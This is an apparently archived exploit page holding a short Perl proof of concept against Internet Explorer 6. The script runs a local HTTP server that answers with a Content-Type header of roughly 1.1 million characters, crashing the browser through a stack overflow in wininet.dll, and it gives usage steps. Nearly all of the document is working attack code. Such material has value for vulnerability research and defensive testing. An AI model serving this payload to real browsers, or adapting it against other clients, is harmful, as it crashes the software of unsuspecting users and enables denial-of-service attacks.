<html><head><title>MS Internet Explorer 6 (Content-Type) Stack Overflow Crash</title></head><pre>#!/usr/bin/perl
# Stack overflow in wininet.dll while parsing huge( &gt; ~1M) Content-Type response
# ex.: Unhandled exception at 0x771c00ee in IEXPLORE.EXE: 0xC00000FD: Stack overflow.
#
# discovered by Firestorm
#
# Usage: 
#	  1) run this code
#       2) open http://127.0.0.1/ with IE
#	     

use IO::Socket;
my $sock=new IO::Socket::INET (Listen    =&gt; 1,
                                 LocalAddr =&gt; 'localhost',
                                 LocalPort =&gt; 80,
                                 Proto     =&gt; 'tcp');
die unless $sock;
$huge=&quot;A&quot; x 1100000;
$|=1;
print &quot;&gt;http server started on port 80... try 'iexplore http://127.0.0.1/' \n&quot;;
$z=$sock-&gt;accept();
print &quot;&gt;connection!\n&quot;;
do
{
	$ln=&lt;$z&gt;;
	print $ln;
	chomp $ln;
	
	if (($ln eq &quot;&quot;)||($ln eq &quot;\n&quot;)||($ln eq &quot;\r&quot;))
	{
		print &quot;&gt;sending response\n&quot;;
		print $z &quot;HTTP/1.1 200 OK\r\nServer: X3 1.0\r\nContent-Type: $huge\r\nConnection: close\r\n\r\ndone&quot;;
		close($z);
		exit;
	}
} while (true);

# milw0rm.com [2006-07-20]</pre></html>